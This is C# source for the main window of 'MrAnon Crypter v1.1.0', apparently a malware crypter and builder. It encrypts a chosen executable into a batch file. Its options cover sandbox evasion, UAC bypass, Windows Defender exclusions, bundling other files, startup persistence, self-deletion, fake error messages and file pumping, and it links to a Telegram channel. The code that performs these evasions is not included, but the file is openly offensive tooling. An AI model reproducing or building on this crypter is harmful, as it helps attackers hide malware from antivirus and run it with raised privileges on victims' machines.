using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace MrAnonCrypter




{
    internal class Form1 : Form
    {
        private readonly Crypter _crypter;
        private readonly CrypterOptions _options;
        private IContainer components;
        private GroupBox optionsBox;
        private GroupBox binderBox;
        private GroupBox startupBox;
        private Label label1;
        private TextBox input;
        private Button openFile;
        private Button build;
        private CheckBox antiVM;
        private CheckBox singleInstance;
        private CheckBox delay;
        private CheckBox fakeError;
        private NumericUpDown delayInput;
        private RichTextBox fakeErrorText;
        private Button addFile;
        private ListBox binderListBox;
        private Button removeFile;
        private CheckBox startup;
        private CheckBox binder;
        private CheckBox startupMelt;
        private CheckBox startupBF;
        private CheckBox startupFE;
        private CheckBox wdExclusions;
        private GroupBox groupBox1;
        private CheckBox uacBypass;
        private CheckBox pumpFile;
        private NumericUpDown pumpFileInput;
        private GroupBox groupBox2;
        private Label label2;
        private ComboBox execMethod;
        private CheckBox botKiller;

        internal Form1()
        {
            this.InitializeComponent();
            this._crypter = new Crypter();
            this._options = new CrypterOptions();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                int int32 = Convert.ToInt32(true);
                Form1.DwmSetWindowAttribute(this.Handle, 20U, ref int32, 4U);
            }
            catch
            {
            }
            this.delayInput.Maximum = Decimal.MaxValue;
            this.pumpFileInput.Maximum = Decimal.MaxValue;
            this.execMethod.SelectedIndex = 0;
            Settings settings = Settings.Load();
            if (settings != null)
            {
                try
                {
                    this.UnpackSettings(settings);
                }
                catch
                {
                }
            }
            else
                Process.Start("https://t.me/mranontools");
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Save(this.PackSettings());
            Environment.Exit(0);
        }

        private void openFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.RestoreDirectory = true;
            openFileDialog1.Title = "Open File";
            openFileDialog1.Filter = "Executable file (*.exe)|*.exe";
            using (OpenFileDialog openFileDialog2 = openFileDialog1)
            {
                if (openFileDialog2.ShowDialog() != DialogResult.OK)
                    return;
                this.input.Text = openFileDialog2.FileName;
            }
        }

        private void addFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.RestoreDirectory = true;
            openFileDialog1.Title = "Open File";
            using (OpenFileDialog openFileDialog2 = openFileDialog1)
            {
                if (openFileDialog2.ShowDialog() != DialogResult.OK)
                    return;
                this.binderListBox.Items.Add((object)openFileDialog2.FileName);
            }
        }

        private void removeFile_Click(object sender, EventArgs e) => this.binderListBox.Items.RemoveAt(this.binderListBox.SelectedIndex);

        private void build_Click(object sender, EventArgs e)
        {
            this.Enabled = false;
            try
            {
                if (!File.Exists(this.input.Text))
                {
                    int num1 = (int)MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    if (this.execMethod.SelectedIndex == 1 && !this.wdExclusions.Checked && MessageBox.Show("It is not recommended to use 'Drop to disk' without 'Win.Def exclusion'. Are you sure you want to continue?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
                        return;
                    SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                    saveFileDialog1.FileName = Path.ChangeExtension(this.input.Text, (string)null) + "_MrAnon";
                    saveFileDialog1.Filter = "Batch file (*.cmd)|*.cmd|Batch file (*.bat)|*.bat";
                    saveFileDialog1.AddExtension = true;
                    saveFileDialog1.Title = "Save File";
                    saveFileDialog1.RestoreDirectory = true;
                    using (SaveFileDialog saveFileDialog2 = saveFileDialog1)
                    {
                        if (saveFileDialog2.ShowDialog() != DialogResult.OK)
                        {
                            int num2 = (int)MessageBox.Show("Build canceled.", "Status", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        }
                        else
                        {
                            FileType fileType = this._crypter.GetFileType(this.input.Text);
                            if (fileType == FileType.Invalid)
                            {
                                int num3 = (int)MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                            }
                            else
                            {
                                this.UpdateOptions();
                                using (Aes aes = Aes.Create())
                                {
                                    this._crypter.Key = aes.Key;
                                    this._crypter.IV = aes.IV;
                                }
                                byte[] bytes = this._crypter.Process(File.ReadAllBytes(this.input.Text), fileType, this._options);
                                File.WriteAllBytes(saveFileDialog2.FileName, bytes);
                                if (this.pumpFile.Checked)
                                    Utils.PumpFile(saveFileDialog2.FileName, (int)this.pumpFileInput.Value);
                                int num4 = (int)MessageBox.Show("Build successful!", "Status", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                            }
                        }
                    }
                }
            }
            finally
            {
                this.Enabled = true;
            }
        }

        private void wdExclusions_CheckedChanged(object sender, EventArgs e)
        {
            if (!this.wdExclusions.Checked)
                return;
            this.uacBypass.Checked = true;
        }

        private void uacBypass_CheckedChanged(object sender, EventArgs e)
        {
            if (this.uacBypass.Checked)
                return;
            this.wdExclusions.Checked = false;
        }

        private void UpdateOptions()
        {
            this._options.DropFile = this.execMethod.SelectedIndex == 1;
            this._options.AntiVM = this.antiVM.Checked;
            this._options.SingleInstance = this.singleInstance.Checked;
            this._options.Delay = this.delay.Checked ? (int)this.delayInput.Value : 0;
            this._options.BotKiller = this.botKiller.Checked;
            this._options.FakeError = this.fakeError.Checked ? this.fakeErrorText.Text : (string)null;
            this._options.UACBypass = this.uacBypass.Checked;
            this._options.WDExclusions = this.wdExclusions.Checked;
            this._options.BindedFiles = this.binder.Checked ? this.binderListBox.Items.Cast<string>().ToArray<string>() : new string[0];
            this._options.Startup = this.startup.Checked;
            this._options.Startup_MeltFile = this.startupMelt.Checked;
            this._options.Startup_BF = this.startupBF.Checked;
            this._options.Startup_FE = this.startupFE.Checked;
        }

        private Settings PackSettings()
        {
            this.UpdateOptions();
            return new Settings()
            {
                InputFile = this.input.Text,
                PumpFile = this.pumpFile.Checked,
                PumpFileAmount = this.pumpFile.Checked ? (int)this.pumpFileInput.Value : 0,
                CrypterOptions = this._options
            };
        }

        private void UnpackSettings(Settings obj)
        {
            this.input.Text = obj.InputFile;
            this.pumpFile.Checked = obj.PumpFile;
            this.pumpFileInput.Value = (Decimal)obj.PumpFileAmount;
            this.execMethod.SelectedIndex = obj.CrypterOptions.DropFile ? 1 : 0;
            this.antiVM.Checked = obj.CrypterOptions.AntiVM;
            this.singleInstance.Checked = obj.CrypterOptions.SingleInstance;
            this.delay.Checked = obj.CrypterOptions.Delay != 0;
            this.botKiller.Checked = obj.CrypterOptions.BotKiller;
            this.fakeError.Checked = !string.IsNullOrEmpty(obj.CrypterOptions.FakeError);
            this.delayInput.Value = (Decimal)obj.CrypterOptions.Delay;
            this.fakeErrorText.Text = obj.CrypterOptions.FakeError;
            this.wdExclusions.Checked = obj.CrypterOptions.WDExclusions;
            this.uacBypass.Checked = obj.CrypterOptions.UACBypass;
            this.startup.Checked = obj.CrypterOptions.Startup;
            this.startupMelt.Checked = obj.CrypterOptions.Startup_MeltFile;
            this.startupBF.Checked = obj.CrypterOptions.Startup_BF;
            this.startupFE.Checked = obj.CrypterOptions.Startup_FE;
            this.binder.Checked = obj.CrypterOptions.BindedFiles.Length != 0;
            this.binderListBox.Items.AddRange((object[])obj.CrypterOptions.BindedFiles);
        }

        [DllImport("dwmapi.dll")]
        private static extern int DwmSetWindowAttribute(
          IntPtr hwnd,
          uint attribute,
          ref int pvAttribute,
          uint cbAttribute);

        private void optionsBox_Paint(object sender, PaintEventArgs e) => this.DrawGroupBox((GroupBox)sender, e.Graphics);

        private void binderBox_Paint(object sender, PaintEventArgs e) => this.DrawGroupBox((GroupBox)sender, e.Graphics);

        private void startupBox_Paint(object sender, PaintEventArgs e) => this.DrawGroupBox((GroupBox)sender, e.Graphics);

        private void groupBox1_Paint(object sender, PaintEventArgs e) => this.DrawGroupBox((GroupBox)sender, e.Graphics);

        private void groupBox2_Paint(object sender, PaintEventArgs e) => this.DrawGroupBox((GroupBox)sender, e.Graphics);

        private void DrawGroupBox(GroupBox box, Graphics g)
        {
            if (box == null)
                return;
            Brush brush = (Brush)new SolidBrush(Color.Yellow);
            Pen pen = new Pen((Brush)new SolidBrush(Color.Green));
            SizeF sizeF = g.MeasureString(box.Text, box.Font);
            Rectangle rectangle = new Rectangle(box.ClientRectangle.X, box.ClientRectangle.Y + (int)((double)sizeF.Height / 2.0), box.ClientRectangle.Width - 1, box.ClientRectangle.Height - (int)((double)sizeF.Height / 2.0) - 1);
            g.Clear(this.BackColor);
            g.DrawString(box.Text, box.Font, brush, (float)box.Padding.Left, 0.0f);
            g.DrawLine(pen, rectangle.Location, new Point(rectangle.X, rectangle.Y + rectangle.Height));
            g.DrawLine(pen, new Point(rectangle.X + rectangle.Width, rectangle.Y), new Point(rectangle.X + rectangle.Width, rectangle.Y + rectangle.Height));
            g.DrawLine(pen, new Point(rectangle.X, rectangle.Y + rectangle.Height), new Point(rectangle.X + rectangle.Width, rectangle.Y + rectangle.Height));
            g.DrawLine(pen, new Point(rectangle.X, rectangle.Y), new Point(rectangle.X + box.Padding.Left, rectangle.Y));
            g.DrawLine(pen, new Point(rectangle.X + box.Padding.Left + (int)sizeF.Width, rectangle.Y), new Point(rectangle.X + rectangle.Width, rectangle.Y));
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
                this.components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.optionsBox = new GroupBox();
            this.botKiller = new CheckBox();
            this.execMethod = new ComboBox();
            this.label2 = new Label();
            this.pumpFileInput = new NumericUpDown();
            this.pumpFile = new CheckBox();
            this.delayInput = new NumericUpDown();
            this.delay = new CheckBox();
            this.singleInstance = new CheckBox();
            this.antiVM = new CheckBox();
            this.fakeErrorText = new RichTextBox();
            this.fakeError = new CheckBox();
            this.wdExclusions = new CheckBox();
            this.binderBox = new GroupBox();
            this.binder = new CheckBox();
            this.removeFile = new Button();
            this.addFile = new Button();
            this.binderListBox = new ListBox();
            this.startupBox = new GroupBox();
            this.startupFE = new CheckBox();
            this.startupBF = new CheckBox();
            this.startupMelt = new CheckBox();
            this.startup = new CheckBox();
            this.label1 = new Label();
            this.input = new TextBox();
            this.openFile = new Button();
            this.build = new Button();
            this.groupBox1 = new GroupBox();
            this.uacBypass = new CheckBox();
            this.groupBox2 = new GroupBox();
            this.optionsBox.SuspendLayout();
            this.pumpFileInput.BeginInit();
            this.delayInput.BeginInit();
            this.binderBox.SuspendLayout();
            this.startupBox.SuspendLayout();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.SuspendLayout();
            this.optionsBox.Controls.Add((Control)this.botKiller);
            this.optionsBox.Controls.Add((Control)this.execMethod);
            this.optionsBox.Controls.Add((Control)this.label2);
            this.optionsBox.Controls.Add((Control)this.pumpFileInput);
            this.optionsBox.Controls.Add((Control)this.pumpFile);
            this.optionsBox.Controls.Add((Control)this.delayInput);
            this.optionsBox.Controls.Add((Control)this.delay);
            this.optionsBox.Controls.Add((Control)this.singleInstance);
            this.optionsBox.Controls.Add((Control)this.antiVM);
            this.optionsBox.ForeColor = Color.White;
            this.optionsBox.Location = new Point(22, 60);
            this.optionsBox.Name = "optionsBox";
            this.optionsBox.Size = new Size(514, 210);
            this.optionsBox.TabIndex = 0;
            this.optionsBox.TabStop = false;
            this.optionsBox.Text = "Options";
            this.optionsBox.Paint += new PaintEventHandler(this.optionsBox_Paint);
            this.botKiller.AutoSize = true;
            this.botKiller.Location = new Point(9, 109);
            this.botKiller.Name = "botKiller";
            this.botKiller.Size = new Size(120, 30);
            this.botKiller.TabIndex = 14;
            this.botKiller.Text = "Bot killer";
            this.botKiller.UseVisualStyleBackColor = true;
            this.execMethod.BackColor = Color.FromArgb(100, 115, 150);
            this.execMethod.DropDownStyle = ComboBoxStyle.DropDownList;
            this.execMethod.FlatStyle = FlatStyle.Flat;
            this.execMethod.ForeColor = Color.White;
            this.execMethod.FormattingEnabled = true;
            this.execMethod.Items.AddRange(new object[2]
            {
        (object) "In memory",
        (object) "Drop to disk"
            });
            this.execMethod.Location = new Point(192, 165);
            this.execMethod.Name = "execMethod";
            this.execMethod.Size = new Size(181, 36);
            this.execMethod.TabIndex = 13;
            this.label2.AutoSize = true;
            this.label2.Location = new Point(9, 169);
            this.label2.Name = "label2";
            this.label2.Size = new Size(174, 24);
            this.label2.TabIndex = 12;
            this.label2.Text = "Execution method:";
            this.pumpFileInput.BackColor = Color.FromArgb(100, 115, 150);
            this.pumpFileInput.ForeColor = Color.White;
            this.pumpFileInput.Location = new Point((int)byte.MaxValue, 100);
            this.pumpFileInput.Name = "pumpFileInput";
            this.pumpFileInput.Size = new Size(92, 49);
            this.pumpFileInput.TabIndex = 11;
            this.pumpFile.AutoSize = true;
            this.pumpFile.Location = new Point(250, 70);
            this.pumpFile.Name = "pumpFile";
            this.pumpFile.Size = new Size(168, 30);
            this.pumpFile.TabIndex = 10;
            this.pumpFile.Text = "Pump file (KB)";
            this.pumpFile.UseVisualStyleBackColor = true;
            this.delayInput.BackColor = Color.FromArgb(100, 115, 150);
            this.delayInput.ForeColor = Color.White;
            this.delayInput.Location = new Point((int)byte.MaxValue, 40);
            this.delayInput.Name = "delayInput";
            this.delayInput.Size = new Size(92, 49);
            this.delayInput.TabIndex = 7;
            this.delay.AutoSize = true;
            this.delay.Location = new Point(250, 15);
            this.delay.Name = "delay";
            this.delay.Size = new Size(141, 30);
            this.delay.TabIndex = 5;
            this.delay.Text = "Delay (ms)";
            this.delay.UseVisualStyleBackColor = true;
            this.singleInstance.AutoSize = true;
            this.singleInstance.Location = new Point(9, 70);
            this.singleInstance.Name = "singleInstance";
            this.singleInstance.Size = new Size(180, 30);
            this.singleInstance.TabIndex = 4;
            this.singleInstance.Text = "Single instance";
            this.singleInstance.UseVisualStyleBackColor = true;
            this.antiVM.AutoSize = true;
            this.antiVM.Location = new Point(9, 31);
            this.antiVM.Name = "antiVM";
            this.antiVM.Size = new Size(111, 30);
            this.antiVM.TabIndex = 1;
            this.antiVM.Text = "Anti VM";
            this.antiVM.UseVisualStyleBackColor = true;
            this.fakeErrorText.BackColor = Color.FromArgb(100, 115, 150);
            this.fakeErrorText.BorderStyle = BorderStyle.FixedSingle;
            this.fakeErrorText.ForeColor = Color.White;
            this.fakeErrorText.Location = new Point(9, 72);
            this.fakeErrorText.Name = "fakeErrorText";
            this.fakeErrorText.Size = new Size(228, 106);
            this.fakeErrorText.TabIndex = 8;
            this.fakeErrorText.Text = "";
            this.fakeError.AutoSize = true;
            this.fakeError.Location = new Point(9, 31);
            this.fakeError.Name = "fakeError";
            this.fakeError.Size = new Size(120, 30);
            this.fakeError.TabIndex = 6;
            this.fakeError.Text = "Enabled";
            this.fakeError.UseVisualStyleBackColor = true;
            this.wdExclusions.AutoSize = true;
            this.wdExclusions.Location = new Point(9, 70);
            this.wdExclusions.Name = "wdExclusions";
            this.wdExclusions.Size = new Size(202, 30);
            this.wdExclusions.TabIndex = 10;
            this.wdExclusions.Text = "Win.Def exclusion";
            this.wdExclusions.UseVisualStyleBackColor = true;
            this.wdExclusions.CheckedChanged += new EventHandler(this.wdExclusions_CheckedChanged);
            this.binderBox.Controls.Add((Control)this.binder);
            this.binderBox.Controls.Add((Control)this.removeFile);
            this.binderBox.Controls.Add((Control)this.addFile);
            this.binderBox.Controls.Add((Control)this.binderListBox);
            this.binderBox.ForeColor = Color.White;
            this.binderBox.Location = new Point(546, 60);
            this.binderBox.Name = "binderBox";
            this.binderBox.Size = new Size(501, 210);
            this.binderBox.TabIndex = 1;
            this.binderBox.TabStop = false;
            this.binderBox.Text = "Binder";
            this.binderBox.Paint += new PaintEventHandler(this.binderBox_Paint);
            this.binder.AutoSize = true;
            this.binder.Location = new Point(9, 30);
            this.binder.Name = "binder";
            this.binder.Size = new Size(120, 30);
            this.binder.TabIndex = 1;
            this.binder.Text = "Enabled";
            this.binder.UseVisualStyleBackColor = true;
            this.removeFile.BackColor = Color.FromArgb(0, 120, 255);
            this.removeFile.FlatStyle = FlatStyle.Popup;
            this.removeFile.ForeColor = Color.WhiteSmoke;
            this.removeFile.Location = new Point(331, 109);
            this.removeFile.Name = "removeFile";
            this.removeFile.Size = new Size(160, 39);
            this.removeFile.TabIndex = 7;
            this.removeFile.Text = "Remove file";
            this.removeFile.UseVisualStyleBackColor = false;
            this.removeFile.Click += new EventHandler(this.removeFile_Click);
            this.addFile.BackColor = Color.FromArgb(0, 120, 255);
            this.addFile.FlatStyle = FlatStyle.Popup;
            this.addFile.ForeColor = Color.WhiteSmoke;
            this.addFile.Location = new Point(331, 67);
            this.addFile.Name = "addFile";
            this.addFile.Size = new Size(160, 39);
            this.addFile.TabIndex = 6;
            this.addFile.Text = "Add file";
            this.addFile.UseVisualStyleBackColor = false;
            this.addFile.Click += new EventHandler(this.addFile_Click);
            this.binderListBox.BackColor = Color.FromArgb(100, 115, 150);
            this.binderListBox.BorderStyle = BorderStyle.FixedSingle;
            this.binderListBox.ForeColor = Color.DarkGray;
            this.binderListBox.FormattingEnabled = true;
            this.binderListBox.ItemHeight = 16;
            this.binderListBox.Location = new Point(9, 69);
            this.binderListBox.Name = "binderListBox";
            this.binderListBox.Size = new Size(313, 123);
            this.binderListBox.TabIndex = 0;
            this.startupBox.Controls.Add((Control)this.startupFE);
            this.startupBox.Controls.Add((Control)this.startupBF);
            this.startupBox.Controls.Add((Control)this.startupMelt);
            this.startupBox.Controls.Add((Control)this.startup);
            this.startupBox.ForeColor = Color.White;
            this.startupBox.Location = new Point(22, 279);
            this.startupBox.Name = "startupBox";
            this.startupBox.Size = new Size(514, 201);
            this.startupBox.TabIndex = 1;
            this.startupBox.TabStop = false;
            this.startupBox.Text = "Startup";
            this.startupBox.Paint += new PaintEventHandler(this.startupBox_Paint);
            this.startupFE.AutoSize = true;
            this.startupFE.Location = new Point(9, 109);
            this.startupFE.Name = "startupFE";
            this.startupFE.Size = new Size(274, 30);
            this.startupFE.TabIndex = 3;
            this.startupFE.Text = "Show fake error on startup";
            this.startupFE.UseVisualStyleBackColor = true;
            this.startupBF.AutoSize = true;
            this.startupBF.Location = new Point(9, 70);
            this.startupBF.Name = "startupBF";
            this.startupBF.Size = new Size(303, 30);
            this.startupBF.TabIndex = 2;
            this.startupBF.Text = "Extract binded files on startup";
            this.startupBF.UseVisualStyleBackColor = true;
            this.startupMelt.AutoSize = true;
            this.startupMelt.Location = new Point(9, 148);
            this.startupMelt.Name = "startupMelt";
            this.startupMelt.Size = new Size(111, 30);
            this.startupMelt.TabIndex = 1;
            this.startupMelt.Text = "Melt file";
            this.startupMelt.UseVisualStyleBackColor = true;
            this.startup.AutoSize = true;
            this.startup.Location = new Point(9, 31);
            this.startup.Name = "startup";
            this.startup.Size = new Size(120, 30);
            this.startup.TabIndex = 0;
            this.startup.Text = "Enabled";
            this.startup.UseVisualStyleBackColor = true;
            this.label1.AutoSize = true;
            this.label1.ForeColor = Color.White;
            this.label1.Location = new Point(18, 21);
            this.label1.Name = "label1";
            this.label1.Size = new Size(91, 24);
            this.label1.TabIndex = 2;
            this.label1.Text = "File path:";
            this.input.BackColor = Color.FromArgb(100, 115, 150);
            this.input.BorderStyle = BorderStyle.FixedSingle;
            this.input.ForeColor = Color.White;
            this.input.Location = new Point(118, 18);
            this.input.Name = "input";
            this.input.Size = new Size(616, 33);
            this.input.TabIndex = 3;
            this.openFile.BackColor = Color.FromArgb(0, 120, 255);
            this.openFile.FlatStyle = FlatStyle.Popup;
            this.openFile.ForeColor = Color.WhiteSmoke;
            this.openFile.Location = new Point(742, 15);
            this.openFile.Name = "openFile";
            this.openFile.Size = new Size(90, 39);
            this.openFile.TabIndex = 4;
            this.openFile.Text = "...";
            this.openFile.UseVisualStyleBackColor = false;
            this.openFile.Click += new EventHandler(this.openFile_Click);
            this.build.BackColor = Color.FromArgb(102, 255, 102);
            this.build.FlatStyle = FlatStyle.Popup;
            this.build.ForeColor = Color.Black;
            this.build.Location = new Point(841, 15);
            this.build.Name = "build";
            this.build.Size = new Size(205, 39);
            this.build.TabIndex = 5;
            this.build.Text = "Build";
            this.build.UseVisualStyleBackColor = false;
            this.build.Click += new EventHandler(this.build_Click);
            this.groupBox1.Controls.Add((Control)this.wdExclusions);
            this.groupBox1.Controls.Add((Control)this.uacBypass);
            this.groupBox1.ForeColor = Color.White;
            this.groupBox1.Location = new Point(546, 279);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new Size(246, 201);
            this.groupBox1.TabIndex = 4;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "UAC Bypass";
            this.groupBox1.Paint += new PaintEventHandler(this.groupBox1_Paint);
            this.uacBypass.AutoSize = true;
            this.uacBypass.Location = new Point(9, 31);
            this.uacBypass.Name = "uacBypass";
            this.uacBypass.Size = new Size(120, 30);
            this.uacBypass.TabIndex = 0;
            this.uacBypass.Text = "Enabled";
            this.uacBypass.UseVisualStyleBackColor = true;
            this.uacBypass.CheckedChanged += new EventHandler(this.uacBypass_CheckedChanged);
            this.groupBox2.Controls.Add((Control)this.fakeError);
            this.groupBox2.Controls.Add((Control)this.fakeErrorText);
            this.groupBox2.ForeColor = Color.White;
            this.groupBox2.Location = new Point(801, 279);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new Size(246, 201);
            this.groupBox2.TabIndex = 11;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Fake error";
            this.groupBox2.Paint += new PaintEventHandler(this.groupBox2_Paint);
            this.AutoScaleDimensions = new SizeF(120f, 120f);
            this.AutoScaleMode = AutoScaleMode.Dpi;
            this.BackColor = Color.FromArgb(255, 29, 32, 136);
            this.ClientSize = new Size(1068, 499);
            this.Controls.Add((Control)this.groupBox2);
            this.Controls.Add((Control)this.groupBox1);
            this.Controls.Add((Control)this.build);
            this.Controls.Add((Control)this.openFile);
            this.Controls.Add((Control)this.input);
            this.Controls.Add((Control)this.label1);
            this.Controls.Add((Control)this.startupBox);
            this.Controls.Add((Control)this.binderBox);
            this.Controls.Add((Control)this.optionsBox);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;

            this.MaximizeBox = false;
            this.Name = nameof(Form1);
            this.ShowIcon = false;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "MrAnon Crypter v1.1.0";
            this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
            this.Load += new EventHandler(this.Form1_Load);
            this.optionsBox.ResumeLayout(false);
            this.optionsBox.PerformLayout();
            this.pumpFileInput.EndInit();
            this.delayInput.EndInit();
            this.binderBox.ResumeLayout(false);
            this.binderBox.PerformLayout();
            this.startupBox.ResumeLayout(false);
            this.startupBox.PerformLayout();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();
        }
    }
}